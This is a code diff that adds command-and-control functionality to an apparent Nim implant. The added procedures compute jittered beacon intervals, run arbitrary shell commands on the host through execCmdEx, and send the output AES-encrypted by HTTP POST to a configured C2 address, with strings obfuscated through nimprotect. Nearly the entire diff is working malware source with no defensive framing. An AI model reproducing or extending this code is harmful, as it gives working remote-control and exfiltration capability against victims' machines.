@@ -1,6 +1,51 @@
+include config
+import std/[strformat, tables, nativesockets, random, json]
+import std/[base64, encodings]
+import system/[io]
+import httpclient
+import nimprotect
 import nimcrypto
 import strutils
-import std/[base64, encodings]
+import osproc
+
+# Declarations
+proc calc_sleep_time*(timeframe: int,  jitter_percent: int): int
+proc run_shell_command*(client: HttpClient, shell_command: string): bool
+proc encrypt_cbc*(plain_text: string, key: string, iv: string): string
+proc decrypt_cbc*(cipher_text: string, key: string, iv: string): string
+proc encode_64*(text: string,  is_bin: bool = false, encoding: string = "UTF-16"): string
+proc decode_64*(encoded_text: string, is_bin: bool = false, encoding: string = "UTF-16"): string 
+proc post_data*(client: HttpClient, command_type: string, data_dict: string): bool
+
+# Globals
+let c2_url = fmt"{c2_scheme}://{c2_address}:{c2_port}"
+
+
+proc calc_sleep_time*(timeframe: int,  jitter_percent: int): int =
+    var jitter_range = ((jitter_percent * timeframe) / 100)
+    var jitter_random = rand(((jitter_range / 2) * -1)..(jitter_range / 2))
+    return (timeframe + int(jitter_random)) * 1000
+
+
+proc run_shell_command*(client: HttpClient, shell_command: string): bool =
+    var output: string
+    var is_success: bool
+
+    try:
+        output = execCmdEx(shell_command, options={poDaemon})[0]
+        
+    except:
+        output = could_not_retrieve
+    
+    var data = {
+        protectString("shell_command"): shell_command,
+        "output": output
+    }.toOrderedTable()
+
+    is_success = post_data(client, protectString("cmd"), $data)
+    
+    return is_success
+
 
 proc encrypt_cbc*(plain_text: string, key: string, iv: string): string =    
     var ectx: CBC[aes256]
@@ -78,3 +123,12 @@ proc decode_64*(encoded_text: string, is_bin: bool = false, encoding: string = "
     else:
         var right_encoding = convert(text, "UTF-8", encoding)
         return right_encoding
+
+
+proc post_data*(client: HttpClient, command_type: string, data_dict: string): bool =
+    var data_to_send = """{"command_type": """" & command_type & """", "data": """ & data_dict & "}"
+    try:
+        discard client.post(c2_url, body=encrypt_cbc(data_to_send, communication_aes_key, communication_aes_iv))
+        return true
+    except:
+        return false
